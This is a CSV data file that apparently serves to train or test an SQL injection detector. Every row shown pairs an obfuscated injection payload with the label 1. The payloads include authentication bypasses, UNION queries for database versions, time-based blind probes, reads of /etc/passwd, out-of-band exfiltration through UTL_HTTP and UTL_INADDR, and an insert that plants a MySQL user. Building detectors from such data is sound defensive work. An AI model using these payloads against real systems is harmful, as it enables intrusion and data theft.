payload,label
"<And 0o0O4O0x0o2X0o6o10=UTl_iNaDdr.GET_HOSt_aDdRess   (
 [ (   SELeCT Distinct  (< useRnAME	 )   FRom \
(<?selecT;diSTiNCt<	(  uSERnAmE  ) &, roWnum AS LimiT FRom[SYs.all_UseRS  )  *WHErelImiT  liKE/ 0B0O4X0O0o5,  )  /*F?
jWGJo{BhxKb/i*/ )`  +    &&   	 'I'+   lIKe    'I",1
oR	0b10b0o6:[liKE?^(sELECt0B2b8) OR''=',1
"sELECT *FROm+userS`wHErE Id  =\ 0b6B9b1 "">{oR  0x6b8  LiKe  0b4o0X8 And{trueor 'Jx'
Not LiKe 'jx'  &&/*(@rL+<MUL<(~30S cek5VDey*/(TRue{ OR  FaLsE|OR FAlSE OrFAlse Or ""s$S0""*noT]LIke ""S$s0O7O0""AND\true<AnD ""Rs""=""Rs"" aND TruE oR 'L;`9' nOT LIKe 'l;`9' oR FaLsE anD TRuE AND trUE  &&  TRUE OR ""HeeO""!=""HeeO"" --
0o0x9O3b1\b",1
">{OR
+/*A5b5x6~K4o0o0b5b1100100hQ
cT	E7*/'teXT' > 't'",1
"0B10011001110 ""! AnD: 0x0o0O9O1/**	X0x6cCJiP*/ lIkE/*(sELECT 76)*/ (SELeCt (SeleCt:0X9))unIoN Allselect/""ADMin"", ""81dc9bDB52D4dc24036DbD8313ED965",1
";seleCT * from USErs WHere/*B
Z|(SELECT (SELECT 1))*/ID
= 0B0  Or  ""%["">or!'j,V'='J,V' ANd (SeLECt (sELECt 0X1)) oR FalSE Or FaLSe --/**/3",1
" sEleCt */**/fRoM usErs wHeRE Id  LIKE  (select 0O0B1001) or (sELEct 1) aNd TRUe Or faLSe OR fALSe OR ""&!J&"" nOt lIkE ""&!j&"" AND True#""; } liKE.  (SelecT (SElecT 0x1)) UNIon/**/SELecT 0O1,verSIon %(  
 ) * --5W=",1
"aDMin' or	'0b7' ?	LIKE++'0B0O0o6')OR^0B110b2 Or}';'=';:', Or ?'2b101<s' nOT lIke='0B101<S'AnD0b1x9@ Or  0b0O0x1f0b110101(noT{lIKe~(seLEct (SELEcT 0b1x1f7o101)) oR?(SeLEcT (seLect 0X8))  or} (seLEct (SeLEct (sELect 0B0Xe62)))<>0xe62 And (SELECT 5620)!=5621 OR FaLSE#	UrWoW",1
"SELECt **frOM	USERs wHerE ID( aNd&True(or (SeLECt 0o0X1dbd)`liKe 7604aNDTrue Or FalSe anD TruE AND (SELEct (SELect (SELECt (sELeCt (sElECT (SELecT 1)))))) And truE#=_ (selECt 0x1) +$:0X7	oR$0B1001X0x8x1  LIKE  0B0b101x0o0O1x8!Or '0O5'    not lIke    '2':OR^""tp""=""tpC""!oR (SELEcT (sELecT 0xfA1)) not lIKe 4401""--&1a+Z",1
": And  0o0o0X0x3o0O9       like ; ?  }utl_iNadDr.Get_hosT_ADDrEss, {(_   ({ ,SelEct diSTINcT` (  usernaMe .) 

FrOm   ( ?SELect dISTINCt  (`
uSERnamE  ) ?, rOWnuM aS LImIT frOm SYS.AlL_Users  )   WHErE~LiMIt  lIKe; 0o0O3b0o1o0B1011o0O9o31   )]	  )    anD 'i'/*oH(uT<Q}y[RwpV*/:lIKe  'i",1
"|SeLeCT|*	frOm%INF]
({;OR``
^`maTiON_SCHemA.TABles--",1
" seLECT;*
FRom`UsErsWHeRE ID;= 0o11o0X1:or ""$&""`OR (seLEcT 0B4)/*}""*/=`(sELeCt 0b1000)[ANd trUe --+0O0o0o5x0x1@/",1
"0O0O0B4B0B0o1550/*p.z_qf-1XKZ1G_*/? )/*|*/
 )) ;,} or[ Pg_slEep](/*R
(SelECT (selEct (SELECT 7)))*/ __tIMe__	)  or	(seleCT 7X14a0b1001)lIKe	0b1061010101010 Or*False --",1
"""sELEcT *FRoM UseRs wHErE iD *=  '2' uNIOn/*
EO */SELEct !<@,VErsiOn^ ( -
 )     and ~ 0XC25!=(SELECT (sELEcT (sElect[0X0B10111Bd))) or ""SP"" liKe ""spA"" and ""3x8}"" Not liKe ""8}\"" or faLSe anD*""im"" NOt lIKE ""imj""  or  fALSe aNd ""g""<>""gy""   OR   faLse oR
fAlsE oR	falSE aND true -- 1'`?S+",1
"dEClaRe[@Q[NvarchaR<](\ (SELect 0o0b0b109119510)
\)+""?sELecT@q;  lIKE   0b0x0b111x0o0B8XBc0B0B0D ...",1
 Or	0X4b0b0B1/**/=	(SElECT?(seleCT (SELECT (SELECT 1)))) OR	'' ;=} ',1
seLect * FrOm&USERS WHerE id!=  1 %!<(SELECT 4) oR0x5 = (SELECT 1) and (SELECT 1)}Or False OR (SELECT 0) -- 1,1
"DECLARE/**/@Q NvaRChaR   (  0xC8  )  ]SeLEcT @Q/**/ /**/ LiKE/**/   0x0b1010011011111010111110010001011101000101110010001111011000101011010110F0072002000640065006C00610079005000270030003A0030003a0031003000270000 exec 
(  @q^ ) ",1
")SeLecT * fROM usErS%WhErEiD, lIKE
 (SElecT (SELECT 1)) oR)""]0x0O3o1""+oR:(seLECt (SEleCt`(sELECt 1))) /**/LIkE"" 0x6   or_  ""V6T"" LIke ""v7tO""+-- 1RpE",1
" seLeCt}* fRoM!USeRS whErE Id ?, lIkE   0B0X1B9X1 or $+<(SELect 0x1) uniON seLeCt (SeLEcT (SelecT (selECT 1))),@@veRSION?%or/**/-0X0 and TRUE||0x9B3B20 <> (sELEct (SELECt 2482))=aNd TrUE
AnD 0X1 aNd tRUe OR False --@4o7Uh@[",1
OR/*U:*/'uNuSuAL':!= `<'unusUaL',1
";or&0X4b201in ] (  SeLECt`@@VersIoN  )	OR-(SELEct 0) aND(""c"" noT Like ""c7o8"" { OR    FALSE+OR~faLSe  or ;(SELect 0) and (SELECT 1) OR ""G""=""G6"" --",1
TRUncAtE,1
As,1
"$or_0b0b1001011001""@=.\0o0o2X3[--",1
"	sElEcT * FRoM uSErs whErE ID=0o1+  oR  0x5|uNIOn+SELECt 3O6X0X1,BaNNER frOm{v$VeRSiON=WHeRE roWnUm =_/*|ib^E*/0X0 And ""y"" NOt lIke ""Y@""; OR  "" Z"" NOt Like "";z""<ANDtRue oR!""Gp""/**/LIkE or 2614=2615 OR False#""GpE"" -- (SELECT.(sELeCt (SeLEct (SELECT 3))))|X~!O",1
"/**/sELecT * froM uSErs WHeRE id  LIKE  2x1 <@$$ unIon SeLECt (seLeCt (SELECT 0)),verSiOn  (`   )  oR fALsE  &&  'F' NOT LIKE 'Fe' --=3!\w",1
"AdMiN""):)&:~
oR  ] `(;""0""/=`""0O0o0B0X1b0o10216407111",1
" SELeCt * frOM users wHere*ID  Like  (seLECT 0o1) Or (seLECT (SELECT 4))  and =TruE Or fALsE || False#""@ UniONSELEct 'a',vErsiON  (  { )   -- 0b0O1lI%@",1
"0b0O6 /**/)   or BEncHMARK  (
/*(SeLeCT oR faLSE and '=g'<>'=Gh' or ""B)^F"" NOt lIKE ""B)^f"" OR False AND True#(selecT 0x7))
 */(sEleCt (SELecT (SeLECt (seLecT (SELECT (SELECT (SELECT (SELECT 10306003)))))))),mD0x0X5 	( ""1   ) /*me$k+b""*/  )  _`oR (SeLEct (SeleCT 0o0x5))  &&  TrUe   &&   ""HY"" NoT LikE""Hy%""#G<O",1
" sElECt *fRom>USerS wHERe iD  liKE  (sElect (selECT 0x4)) UNIoN SELECT .0b0b0b105_,vERsiON ( =	 )  -- (SELECT (SELECT 7))*",1
"AnD (seLECt (sELecT 9x0B0x0o0b0b100101100100101000101))<;lIKE  Utl_iNaddr.geT_Host_AdDreSS   (+ (,(:  SelecT{syS.DAtaBAse_NAmE-fRoM DuaL  ))   $)   ;AnD^'I'=('I",1
"-Or*2X6B7X3x5	]=$
3B2o4	#""",1
"selecT *FRoM}usERs?wHErE/Id  lIkE  0x1/*$Ux~}HR9oPYOjBu3Z+GvWI1eLDhl?g~n7T*/%$]6X0B0O0X8o0o0X0O1 {oR] 3X1`:=/*Y$Ovl$u*/^0X1	] &&   ]0X6""}OR)<FAlse:--(1lg/G",1
"SELeCT *)FROM useRs WhERE?id=0x0X7 %!<@ Or}0X0O5B0o0B1000  LIkE 0x7 OR/*|;v*/(seLecT 0xC3c) nOt lIKe&0x0X17fE   Or   '&.p' noT liKe '&.p'?oR (selECt{0x0x0)  or) ""X""  nOT likE  ""x"" ANd 'dtz' nOT  liKE  'DTZr' ANd "")""!="")0b0x64"" Or (selecT 0o0O11007) not LikE (selECt (sElECT (selECT (selEcT (SELECT 1615))))) Or^(SElect (SelEcT (SeLEct (SELECT (SELECT 2021)))))
noT like (SELECT 8x979) Or ""["" NOt LiKe ""["" oR 0X0xd5F NoT lIke (SELECT 8510)[--
(seleCT (SELEct 0)) c<2x9",1
"; if not  () substring
 (   .(   select @@version  )  ,(SELECT 0b0x0o23),(SELECT 8)  )   <> 0x0x0  )  'waitfor!delay,'0:(SELECT (SELECT 0)):0o2' OR False OR False OR 0x0 --",1
"1	_)*| or sLEEP%[(  __tiME__*()/**/  Or_0B0B1011101001000100001100010111010001100 <> 0xc48 aND 1#p2R",1
" SelECt * fROM UsERs wHerE id  = /*]).*/(SeLECT;0o3x0x7) OR ""0b0x1_"" or (SELECT (SELECT (SELECT (SELECT 1))))  =' (sElECt=0o0x1X3) oR FaLSE aNd 'oO'?NOT LIKE 'ooB'  AND  True
-- 7x7L",1
" SElEcT * FRoM uSerS WHERE Id =
(SeLECT (SELEct 1)) <0X7 ;and ""tRuE_Or (seLEcT 0)    And   |TRue AND TRUE or 0xd32 nOT  LIke  0xEC2 OR/*='ii}*/FalSe## uNIoN SElECT 0o0b4,vERsIOn- (    )   -- (selecT (seLECt (SELECT 1)))}>b",1
" seLeCT=* FRom USeRS wherE(iD   like   (SELeCt 0B0x0o0o1)""+ $+*\ UnIOn SEleCT Null,@@VErsiON ^ OR ? False AND ""	;sTi"" NOT LIKE ""	;sTi|"" --0",1
"SElEct^* fROM uSERs<wHerE ID=(Select 0X0O1).|<@ oR\(SELECT 1)=1--33""",1
"
*	OR
/*;S0b0o3psI~*Gj{p*/@tRue--",1
HI'_( )$OR`;`;['x'.=?'x',1
"select * from users where id  =  (SELECT (SELECT 3x1)).<@ or 0x1$ LIKE  0b1 AND ""		C""<>""		CW"" OR (SELECT (SELECT 0)) OR False -- 2",1
" SelEct * FROm uSers wHErE Id( LIKE  0B1 or
"".,""=OR`(sELEct (sELeCt 0))  LIkE: 7'and 0O6O1aNd (SELECT 1) Or FAlsE or FalSE#and (selECt (SeLeCT (seLECT 5))) oR FalSE ANd 'fs' noT lIKE-'fS-' OR ""8UUi""=""0uUiO"">And 'H'!='h&' -- 3B0vxKRo[JT",1
aDMiN'/*U(fV1*/~[AND=[0b1010010015101|NOT LIKE'5287AND 1#;u,1
" seLeCt * FrOm uSerS WHeRe Id LIKE (SeLect (selECt (SELECT (SELECT 1)))) <@$_ UNiON SELEcT 0O2,VErSION  (   )   aND!""%-""=""%-""'--
1",1
" seLeCt * FROm uSErs WHeRE id LIkE (select 1) oR "",  (  ""+oR (SelECT 1)  =  1 OR FAlsE -- 0X0b6x1",1
" SeLect *~FROM userS whEre(ID-   LIKE    9x1 Or "",{""
Or""0b0o10=(sELect (SeLect (SELEcT (SeLeCt 7))))
-- 1'C? w",1
" UnIoN selecT 1x8,loAD_fiLE ](  '/ETC/PassWd'  )_,(sELeCt (sELecT 0o6)),(sElECt=0X2),0O7;",1
"""[;)_ ;wAItF/*,}S5z]?uS*/OR?\DElAY_'0b110:(SELECT (SELECT 6)):__tImE__'--",1
"[or-'unuSuAL':[nOT likE 
 'UnUSUal'",1
"iNsErT
IntO
mYsQl.usEr /*vmKx^e*/ ( useR, hoST, paSsw:or d )   vALUES   ( ;'NaMe', 'lOcalHosT', pAssWOrD  (/*$kok!p*/ 'pASs3X0b0B10b0B11111011100e'; <)_#like )   ",1
"admiN""or:""4O0b5b1100100"" 	=?;""0X0b0b0X0o7""/*",1
"	SELeCT * fROm*UserS&WHeRE Id)_= ;0x0 OR  ""0X1]](  ""  lIkE  0X0o8 Or(SelEct=(SELeCt (sEleCT 0x4)))  like[ 0X0B0B1111101004^ && ?0X9e95likE 0O0b10011110101110_--+0X0b1{(ymw!O]R",1
"	seLeCt *;frOm)uSErs wheRE/iD/*)*/	=  (sEleCt (SELECT 1)) Or	\<2X1]UNioNSElECT`(seleCT 0o3),@@VeRSIOn Or`faLse  OR  ""L""!=""L"" oR,FalsE oR 0 OR False -->7",1
LIKe,1
"oR'uSERnAme Like ChAr""!(/0b8O0b11615120X28
|)?",1
" )^ 
`)/*C^o*/?   OR :PG_sLEEP%
(	""__TImE__	&) 	Or^(sELEcT 0x0X0b0B0b100110100001110100101010F)!=0b0B0b0B1110101101100100111001000101100011010111	OR ""$""=""$/"" AnD trUE OR ""h""<>""H"" AND 1975=(SELECt_1675) and 4858=4850 --",1
"SeLect:* FrOm}users!WhERE+ID, likE 
(SElEct 0x1)oR $+<\	OR\6o5x0x4O4:/*&c/A/XSux""xgJL]M*/like :0x1 or FalSe--1V\2vH",1
"Or (SElECt*8)]
LIKE%
8",1
";seLECT * FrOM`USeRS wherE ID = (sELect 1) OR "" =(  ."" oR (sELeCT_1) = (SeleCT 0) -- 1",1
"seleCt * FrOM	USErs WHEre iD' = 0x9 OR   ( ^$+ ()   lIKe (SelECT 0o0B2O1) or 8_ liKe  (SElect (SElECT 0x8)) ||%0X1eF4nOt LiKe (sELEct (SeleCt 6994)) 
 aND ` tRue || (selEct (SElect (seLECt (sElecT 0XA2))))<>9x5fA ||<""(>*I""<>""(>*I"" and'(seleCt](seLeCt 0XE67))<>0XE3B Or/*Vf*/""!Cp"" lIke ""!CPk"" Or falSe  oR  0o0o0 Or 0xD24&LIkE 0Xd25 Or (SEleCt (SeLECt 0x0)) or/*B](SELECT 1)*/FALsE --^0x0o0X0b11a Y)}]H;AH",1
EXEc%sp,1
" SELECT * FRom usErS WHErE iD =/*;&?OB
GB=GeZ*/0x9 or \+<$)unioN seLect (SeLecT (SELECT (SELECT 1))),@@VERsIoN \ OR   FALse!AND True -- 0o0B1b0o161",1
"sELEcT* FROM USERS whERE/*6G8
Q[PE*/Id`   lIke    (sEleCt 0B6)- Or  \<$Or""(SelEct (SELECT 1))=(SelEct 0X9) oR FAlsE OR False -- 0x0x0O1[#LrV?
6",1
" seLECT * fROM""uSErs WHeRE
id= (SELECT (SELECT 1)).~ aND  6 uNIon SelEcT (SELECT 3),VersIon	 (  ? ) /*5)$\+i*/  AND  True AND;3 OR	False --(1",1
AdMIN'$oR0o0b110O8B8=0x8X0O0o1/*,1
"a'-WAItF ;/*^t]=W;
<>Wvsx3;*/or { DeLay/'0:0b0B0b1111110011x8x0:11'--",1
" SeleCt * froM&USeRs WHeRE Id /**/=  0o3 + &(  \  )   Union SeLect nULL,@@VErSiON oR (SELECT (SELECT (SELECT (SELECT 4))))  OR  False OR False -- 0x1|H",1
" SELEcT~* frOm Users WheRE
id    LikE    (SELECT 8) UNIon sELeCt .(SeLEcT (SELECT 6))$_,vErSIoN  (    )    OR  FaLsE AND 1 -- 0B13K9",1
"aNd`(SelecT (SelEcT 0o11))in   (  seLeCt vaR fRoM,TEMp )  --",1
Hi'@)	_Or/**/+/*[9b0b10001111000011100111001100110ry:fP$&fe*/(+'a'(lIkE/**/;'A,1
".&&(SELeCt (SeLECt 0O0o0o0O8O6))/ LIKe*:UTL_INADdR.GEt_HOst_addRESS   (  	 (	 	SELecT DIstInct  (! cOluMn_NAMe. )!  From  ( *sELect distiNcT ~(^COLuMN_NAMe  )  , RownUM'AS]LimIt FroM AlL_TAB_CoLuMnS  )   Where LimIt LikE*6X0o0O3O3o0o2b105b0o121x0x9b0O2Xa   )    )   >aND\'I'='I",1
"ADmin"">Or	0O0x0B111
= /0X0b0b0B1101101",1
"""`	)_}_Or<`True--",1
" SELect *'from users.wHERE ID= '0B9'   OR  ?FAlse or[fALsE""Or^""<?`&""<>""<?`&""*Or FALse and ""b""<>""b+""  &&  (seLeCt 0xc90)=(SELect (seLECT 6220))  or  (SELecT (sEleCt (sELect 6)))#or $).  =?~7x0o10 uNIoN SELecT 5X3,@@VErsioN~or FALsE -- 9'VLH]U&'(Mby",1
" SElect * From}uSerS whEre id    LIkE,   (sELEct (selEcT 1)) OR ""  ( {""=Or 4X1  LIKe  2x6 or!faLse AND True -- 0B1Ajk",1
"0X0b1 ;)<. Or Pg_SleEp  (; __tiME__ )  }or  0x1Dd8}nOt In (0O0B1101001100101,(SElEct (SELect 7640)),(SElECt (sELEcT 0B0X1DD9)))  OR  (SElEcT (SELECT 0)) --",1
"sElecT * froMuSerS whEre ID/*.[(t*/ OR False OR False AND True#= 0x1 or ""{.""   OR   (SELECT 0x9)  =  0o1 and ""d]W"" nOt LiKE ""D]wE"" or:(SELECT (SELECT 0))!oR (SELECT 1)`OR (SELECT (SELECT 3x25d8)) != 0x35d8(AND True -- 7D",1
"""!})
` :or ;SleEP ;(	!__tIME__~@) /**/<
=@{""",1
sElEct *?fRom USers/*J%(SELECT`(SELECT 0x0))=*/wHere Id{= 0b0o5.<@.'	OR ;0o0o0X0.=	0x0o1 --)5g{GoPm,1
"AdMin""  )|  or[  ( 
""2B0o6o9B113"" -=^`Or:`faLse  OR  FAlSEAnD(SELeCt0O0O1)  or+ fALSE aNd'truE  AND  0x1?or FALse && TRUe#/*EA*/""0B7o8""--`(SELECT 0)?X",1
"^SELecT * frOM USErS<wHeRE AND TruE  Or  False && '9`&[' nOT LiKE '7`&[T'    aND  
 (sElecT 9X3) ANdTRUe Or faLSE ANd (selECT (SElEct 0x1)) oR FALsE#id%[=] 0O4O5<@..,UnIOn SEleCT 0b0X0,VeRsion  (    )@  -- 0O1h }$KP<8gc",1
" SElect *fROM usERS WheRE id =>'6' + @ 2O4 UnIoN sElECt,0B120o0O4o0o8X0o10,VErsiON &(   ) % Or ""S)"" NOT LIkE ""S)""=oR (SElECT (seLEct (SELECt (sELEcT (Select (SELECT 0))))))  oR '""DiD"" NOT LIke
""did""   or   fAlSe oR 0X15BE Like 0x15bc  aNd  (SElECT 0O1)  OR  False -- 0o1'""jUk/OB2[[V",1
sElecT * fROM uSERs/*buI*/wHERE Id  =  (SElEct 0x1) + \+%1or 0b0o1  = $(SELECT (SELECT 6)) oRFaLse or fAlse -- 1ab,1
" SElECT * FrOm uSeRs wherE Id _=  (SeleCt 6) oR "";5""&or 0o1 = (seLecT\(sELECt 1)) AnD TRue -- 1",1
" SELEct * fRoM/*sg*/useRS WhERe ID =/*]*/(SeLEct (selEcT (SELeCt 7))) or ""%&"" Or 0o6] =
 0x6 oR FALSe or (seleCT (selECT 0X1C2A))  NOT LIKE  0x1c2A Or ""6"" LikE ""6+""<--)8",1
"1/*(!l&VA@R/&di*/aND;2x0B101X1
=*0B8X1",1
"oR (sELeCt (SeLEct 0B0O156x0)) ]=`;2b0x0x5 OR  ""{X""!=""{x""	And true/**/AnD TruE aNd;(SELecT (SELECT 5123)) != 5124 ANd TRue#;7j",1
"UNIon?selEcT/*]U`z*/*>fROM useRS_wheRE@logiN   ANd<;'egg']noTLIKe`'eGG \  OR    falSe#'#==^""CHaR ...n~ng1",1
"=SelEct
* fRom	useRS{WHeRE id=7x0b0unIoN/**/SeLECT (sElEct (SELEct (seLeCt (SELECT 7)))) ||+@,vErSIon  (    )^<+Or  0x1a2e=(selEcT 0X0X0o1a7B)| oR  'OU'  LIKe /*{Z?f`*/'Ou%' Or (SELEcT (seLeCT 0x15FC)) nOt LIKe\(seLeCt 0x17fc) OR FALSE -- 0X1<d\\ZPAs<%",1
"adMin'~
)
/*[)~nf)Oghr.D;(sELEcT&(SeleCT}1)){	
H*/	 or<'0O0b0b1O0B0b1000010001110100000111001001000O1'
%liKe^('9o4'--",1
" SeLECt * frOM uSErs*WHErE iD  LiKE   (selECT_0B0b1)*   OR    ""{;"" oR 0x5x1  like  6O1(Or]fALsE ANd trUE OR False -- (SELECT 0)}qEMM",1
" SeLeCT * FRom users`WhEre?ID  ]likE: ['6'(OR """"<@<unION sElEcT (SEleCT 8o0O0x9b0o0B5),versiOn  (?  )' ?  ANd  [True	--	6O3o0o2O2'TXZGD{",1
"
SElEcT * From USErS WhEre iD  =  0x1 oR ""?,""  oR  0o2 &LIKE  (SELECT (SELECT (SELECT (SELECT 7))))   OR   False -- 1",1
" SEleCT *=frOM
uSERs WHEre iD  =, '0o5' ||0o0X0b1 unIOn SELect (SELECT 0b1),BANNer from v$VerSiOn wHerE RowNuM  =  (SELECT (SELECT (SELECT 1))) oR "";<"" lIKE?"";<r"" AND 0x1 OR False -- 1'TVJ",1
"1`OR bENchMARK  (	 (SELECt 8x929680),md4 $(  0x9   )    )    OR false ?AND ;""P)F<"" NoT = ""p)f<("" oR (sELect (seleCt^(seLEct 0))) OR False AND 1#L",1
PrOcedUrE,1
"oR''\[/*JG0o0b0o0b111o9J^/z]f_
2r*/likE[+:'",1
"     &&   `*(selecT(seleCT 0O2o7X0o7O5b0o5o0b0b9o0o0b0b0B1011101910002X0b0B10b0o2)){`liKe  utl_iNaDdr.GEt_HoST_ADdRess `/*Q/""C>EIW*/(`   (-""?seLeCT.SYs.lOGIn_USEr+fRom DUal- +)    )<	     aND   'I'='I",1
"   aNd : (SeLecT (sElecT (SeleCT 2)))  LIke  uTl_iNADDR.geT_Host_aDdrEsS 
 (    (   SelecT dIsTINcT  ( ""uSERNAMe{ )   froM   (  sELect DIsTinct  (@ usERnamE|)  , rOwNum As lImiT FroM sys.All_uSeRS  )<  wHERe liMIT  LIKe ^(sElecT (SeleCt 0O4))   )    )  ; aNd 'i'/*s|dH{*/= 'i",1
" SELeCT * From UsErS Where ID <=  0X0o0B50 or   (\.  )   `= (SelecT 6X1B10)_uNiOn seLecT 0X8x0o0O3,@@vERsiON aND TRUE or
'z'='zJ' ||)'\' != '\' OR ""c""!=""C"" or=fALsE oR FaLSe Or ""<{P""  Like  ""<{PQ"" {and  ""B/ }<"" not lIkE ""b/ }<;"" AnD TruE AnD	(SELecT (SelECt (seLecT (select (sElecT (SELECT 1)))))) aND tRUe  Or  FALSE OR False -- 8CJIV;j",1
SElECT * fRoM usErs wHErE iD (=  '1'~  OR    $ (sELECT'1):lIke  0x0b5 Or[(SELECT 0) ^= (seleCT (sELect 0))  or  faLSe  AND /(SelECT 9X1B1A) LikE (SElEcT (SELEct|0x0o21f6))+or False OR faLSE oR 0X0 OR 0 -- 1'Ir,1
"""	 OR; ;""""^""",1
" SeleCT * fROM UsErS{whEre;iD  LIkE< 0x0/*OtO*/oR \< =0b0b0X3 UNiON`SELEcT (selecT (selECT (SELECT (SELECT 4x1)))),@@verSIon OR False -- 0x0b1Dxb6",1
" SeleCt * FrOm usERs WHEre Id  =< 0x0B100O7 UNIOn sELecT (seLECT (seLECT (sELecT?(seLECt 1))))<@$,vERSiOn  (    )!   
And   TRUe And '
'='
' anD 'W' NOT{liKe 'Wi'/**/aNd (sEleCt (SeLecT (SELECT 5153))) nOT lIke (select 6158)  AND  tRuE AnD 1  or  0 AnD 'Cw' noT lIkE 'cwk' --/**/1Fe",1
"'SelEct~* FrOm(UsErS whEre/*0b111R*/id!~LIkE	]0o8b5B7O0b0O49140734o1<*\ UNION:seLECT nUll,@@vERsIon   &&  <TRuE Or'FAlSE --	1bK9Z
",1
",select *}FroM usErS wheRe-Id   like/*)rN*/  '0o1'[Or
!<@ UniON,SELEct;(seLect~0o0O7X0O1),VersIoN  (~   )\  OR;'Hg'='Hg R'& OR; false AND?tRUe Or AND (SELECT 1)#faLsE AND (seLeCt (SElEcT (SELECT 1))) -- 0O0'PQF
tBE=",1
" SElecT * FrOM&USeRs/**/wHerE iD LiKe. 4x3 oR "".%""& ||  (sELecT (Select 1))  LIKe  (SeLEcT (SeLECT (selecT 8)))""--(4X1",1
ADmIN'/*,1
" sELEct * frOm userS WHERe ID=(SelEct 1) oR{""  (%  ANd ""d	"" NOt LIke ""dK""'OR (SelECt (SelEct (SELECT 0)))#""  or ~0o5   LiKe;/*@A#<Kh.(seLECt 5)/D*/ 6 --0b0X1?.&U!",1
`   OR~  /*AV>rJbi[WI*/ UTl_hTTP.rEqUeST,1
"	 &&  0B0B0O0b10011101X4 likE>UTl_INaDdR.geT_Host_addreSs~ (!{{ (  &seLectDIstINCt +(  TAble_NAME' )   from   (  seLEct^DISTInCT  (
 TabLe_nAMe, )!<, RoWnUM as LiMiT fRomsYs.All_tAbLes ])  'wHERELiMit   LiKE   ~(sEleCt 0X0X8X1O0B0b1011101111010)   ) ~ 
)  /*]b)<0X0b10uA?{OkA$gGqC%m_*/ anD 'i'='i",1
" SELeCt/*|{bSl%9$*/*frOm useRS Where|ID* likE  '3o6'<@.. UnIon SeLECt;0x0b0O0o0O0X9O0x2,veRSIOn  (    )'   Or  "";"" nOT LikE "";"" OR ""}"" LikE ""};"" && (sEleCt (sElecT (sELeCt (SeLECt 8250))))!=4X0XCbB && "":"" NOt like "":t"", OR  """"""$nOt lIke """""" And (SelEct 1) or faLse aND 1 And TrUE  OR  fALSe and (sELecT (SELECT (SELECT 0x139a)))<>5019 anD TRue :&&  ""ey""!=""eyS"" OR<False -- 0o0B0o4O1'&#A4RL?A-&i)}(",1
"""   ) %^ )	   OR^BeNchmArK-[(  (sEleCT 0x7X9D2a60),md5  (/**/ 4b2B9 : )    )  .  or (SEleCt (select (sEleCt 3X9))) And (SeLecT 1x1)  Or  FALSE OR FaLsE or FaLse aND (sELecT (SelECt 1))#ZC",1
"	SELEct `* froM users WheRe)iD  liKE  0B0O3x4 <@.$ unION seleCt (seLECt (SELECt 1)),vERsIon /**/(    )   && true oR ""P""=""PS"" Or ""^""/nOT like ""^"" oR faLse  ANd $True or FALSE -- 11
",1
" selecT * FROM uSeRs WheRe Id* liKe  0x0O7 or $ .  LIKE   (SeLEcT (SelEct 0O4X7)) unIon]SELecT (sEleCT 1X0O1),@@VersiOn/*}P	Rja8c{*/--?8J	K",1
SElECT * From USErs+wHeRe ID  =  '4' <@.$ or 6 {=  (SelEct (sELECt (SELECT (SELECT (SELECT 5))))) AND 'G' NOT LIKE!'GZ' --1'[,1
"0b111x6
UnI/*Fk**/ON}sElECT@ALL FROM<WHeRE",1
"}sELEct * FROm uSErs WhEre;id< LIkE^?9x6X0X1 +$ . UnION*SeLecT NulL,@@VeRsiON]  OR   (SelecT 0o0x5) Or fAlsE`--	0O0B2O0O0z",1
" seLECT *;frOM uSErs$WhERE""ID<=<0B0XaX5 |oR  7x0x5  or  ""4"" Not lIKe<""4""	oR	(sElECT (sELECT 0x0)) or fALSE AND True#""? UniONSeleCT`NULL,VeRSiOn/*:y9:r*C&RW*/;(
?  )   -- 0b10B0b0o0b1305X0o1""`d+",1
AdMIN'@ ) `  OR /*(sELEcT (SElECt (sELEct 0o2)))@(sELeCt 0X8)<&(SeLEct 0O11)*/'1' 	= 	'8X3X4'_oR (seLECT 0x0) AND+TRUE AND True OR False#zcb,1
"; OR  ,Utl_http.REQueSt [(~]'hTTp://(SElecT (seleCt 0b0x2a)).3X0o0B93101C.(SELect	(sELeCt>(SELECT 7))).(seleCT 0x1)/'{ );/*(aQGcR0*/\ *or :''",1
or@'7659' ;LIKE  '7659,1
" selEct * froM usErs whErE Id {=  (sELEct 1) Or ""{@"" OR (SELECT 1)\=` (sElECT 1)  And/*;_Xb""*/ (SELECT 1) oR 0 && true OR 1 or FaLSE OR fALsE -- 0x1",1
" SelECT * froM Users Where Id  =  7 UniOn SElecT +!<(selEct 5x1),VERSION  (   	)     aNd   TRuE oR FALsE or 0 OrFaLSe -- 1DA",1
